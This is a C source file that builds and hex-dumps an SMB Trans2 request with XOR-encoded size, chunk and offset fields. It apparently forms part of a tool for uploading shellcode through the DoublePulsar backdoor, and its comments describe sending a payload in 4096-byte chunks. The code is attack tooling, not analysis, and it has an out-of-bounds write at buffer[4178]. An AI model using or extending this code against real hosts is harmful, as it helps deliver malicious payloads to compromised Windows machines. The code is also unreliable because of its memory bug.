#include <stdio.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

void hexDump(char* desc, void* addr, int len)
{
	int i;
	unsigned char buff[17];
	unsigned char* pc = (unsigned char*)addr;

	// Output description if given.
	if (desc != NULL)
		printf("%s:\n", desc);

	// Process every byte in the data.
	for (i = 0; i < len; i++) {
		// Multiple of 16 means new line (with line offset).

		if ((i % 16) == 0) {
			// Just don't print ASCII for the zeroth line.
			if (i != 0)
				printf("  %s\n", buff);

			// Output the offset.
			printf("  %04x ", i);
		}

		// Now the hex code for the specific character.
		printf(" %02x", pc[i]);

		// And store a printable ASCII character for later.
		if ((pc[i] < 0x20) || (pc[i] > 0x7e)) {
			buff[i % 16] = '.';
		}
		else {
			buff[i % 16] = pc[i];
		}

		buff[(i % 16) + 1] = '\0';
	}

	// Pad out last line if not exactly 16 characters.
	while ((i % 16) != 0) {
		printf("   ");
		i++;
	}

	// And print the final ASCII bit.
	printf("  %s\n", buff);
}

typedef struct __attribute__((__packed__)) 
{
	unsigned char parameters[12];
} smb_parameters;

typedef struct __attribute__((__packed__))
{
	uint16_t type; //added by me; remove if there is a problem
	uint16_t length;
	//unsigned short length;
} netbios;

typedef struct __attribute__((__packed__))
{
	unsigned char wordCount;
	ushort totalParameterCount;
	ushort totalDataCount;
	ushort maxParameterCount;
	ushort maxDataCount;
	unsigned char maxSetupCount;
	unsigned char reserved;
	ushort flags;
	uint32_t timeout;
	ushort reserved2;
	ushort parameterCount;
	ushort parameterOffset;
	ushort dataCount;
	ushort dataOffset;
	unsigned char setupCount;
	unsigned char reserved3;
	ushort subcommand;
	ushort byteCount;
	//ushort padding;
	unsigned char padding;
	
} Trans_Response;

typedef struct __attribute__((__packed__))
{
	unsigned char protocol[4];
	unsigned char command;
	uint32_t NTSTATUS;
	unsigned char flag;
	ushort flag2;
	ushort PIDHigh;
	unsigned char SecuritySignature[8];
	/*
	from Microsoft documentation: UCHAR  SecurityFeatures[8];
	unsigned char securityFeature[8]; OR 	BYTE SecuritySignature[8];
	*/
	ushort reserves;
	ushort tid;
	ushort pid;
	ushort uid;
	ushort mid;
} smb_header;


int main() {
    
    unsigned char buffer[4178];
    memset(buffer, '\0', 4178);
    buffer[4177] = 0xFF;
    buffer[4178] = '\0';
    
    netbios *nb = (netbios*)buffer;
	smb_header* smb = (smb_header*)(buffer + sizeof(netbios));
	Trans_Response *trans2 = (Trans_Response*)(buffer + sizeof(netbios) + sizeof(smb_header));
    
    nb->type = 0;
    //int buf_size = sizeof(buffer)-4;
    nb->length = 4174;
    
    smb->protocol[0] = '\xff';
	smb->protocol[1] = 'S';
	smb->protocol[2] = 'M';
	smb->protocol[3] = 'B';
	smb->command = 0x32;
	smb->NTSTATUS = 0x00000000;
	smb->flag = 0x18;
	smb->flag2 = 0xc007;
	smb->PIDHigh = 0x0000;
	smb->SecuritySignature[0] = 0;
	smb->SecuritySignature[1] = 0;
	smb->SecuritySignature[2] = 0;
	smb->SecuritySignature[3] = 0;
	smb->SecuritySignature[4] = 0;
	smb->SecuritySignature[5] = 0;
	smb->SecuritySignature[6] = 0;
	smb->SecuritySignature[7] = 0;

	smb->reserves = 0x0000;
	smb->pid = 0xfeff; 
	smb->tid = 2048;
	smb->uid = 2048;
	smb->mid = 66;
	
	trans2->wordCount = 15;
	trans2->totalParameterCount = 12;
	trans2->totalDataCount = 4096;
	trans2->maxParameterCount = 1;
	trans2->maxDataCount = 0;
	trans2->maxSetupCount = 0;
	trans2->reserved = 0;
	trans2->flags = 0x0000;
	trans2->timeout = 0x001a8925;
	trans2->reserved2 = 0x0000;
	trans2->parameterCount = 12;
	trans2->parameterOffset = 66; // make this dynamic -> calc based off sizeof(smb_header) + sizeof(Trans_Response) < PARAMS ARE HERE >
	trans2->dataCount = 4096;
	trans2->dataOffset = 78; // make this dynamic -> calc based off sizeof(smb_header) + sizeof(Trans_Response) + sizeof(smb_parameters) < SMB DATA IS HERE >
	trans2->setupCount = 1;
	trans2->reserved3 = 0x00;
	trans2->subcommand = 0x000e;
	trans2->byteCount = 4109; //make this dynamic -> calc based off sizeof(params)+sizeof(SMB_DATA)
	trans2->padding = 0x00;
	
	printf("Offset of Parameters:  %d\n", sizeof(smb_header) + sizeof(Trans_Response));
        printf("Offset of Data:  %d\n", sizeof(smb_header) + sizeof(Trans_Response) + sizeof(smb_parameters));
	int param_offset_len = sizeof(smb_header) + sizeof(Trans_Response);
	int dataOffset_len = sizeof(smb_header) + sizeof(Trans_Response) + sizeof(smb_parameters);
	trans2->parameterOffset = param_offset_len;
	trans2->dataOffset = dataOffset_len;

	unsigned int XorKey = 0x58581162;
	
	smb_parameters *smb_params = (smb_parameters*)(buffer + sizeof(netbios) + sizeof(smb_header) + sizeof(Trans_Response));
	
	//make DataSize dynamic where it calculates the size of the buffer of the payload / shellcode
	//In this case, this is static but will change to be dynamic in the future.
        unsigned long DataSize = 0x507308 ^ XorKey;
	
	//size of the chunk of the payload being sent.  all but last packet are 4096
        unsigned long chunksize = 4096 ^ XorKey;
	
	//offset begins at 0 and increments based on the previous packets sent
        unsigned long offset = 0 ^ XorKey;
    
    memcpy(smb_params->parameters, (unsigned char*)&DataSize, 4);
    memcpy(smb_params->parameters + 4, (unsigned char*)&chunksize, 4);
    memcpy(smb_params->parameters + 8 , (unsigned char*)&offset, 4);
    
    /*
    smb_params->DataSize ^= XorKey; 
    smb_params->chunksize ^= XorKey; 
    smb_params->offset ^= XorKey; */
    
    //fill the rest of the buffer
    int rest = sizeof(buffer) - sizeof(netbios) - sizeof(smb_header) - sizeof(Trans_Response) - sizeof(smb_parameters);
    printf("size of buffer:  %d\n", sizeof(buffer));
    int size_of_packet = sizeof(netbios) + sizeof(smb_header) + sizeof(Trans_Response) + sizeof(smb_parameters);
    printf("size of packet:  %d\n", size_of_packet);
    printf("The rest is:  %d\n", rest);
    memset((buffer + sizeof(netbios) + sizeof(smb_header) + sizeof(Trans_Response) + sizeof(smb_parameters)), 0xFF, rest);
    
    hexDump(NULL, buffer, 4178);
	
    hexDump(NULL, smb_params->parameters, 12);
    
    return 0;
}
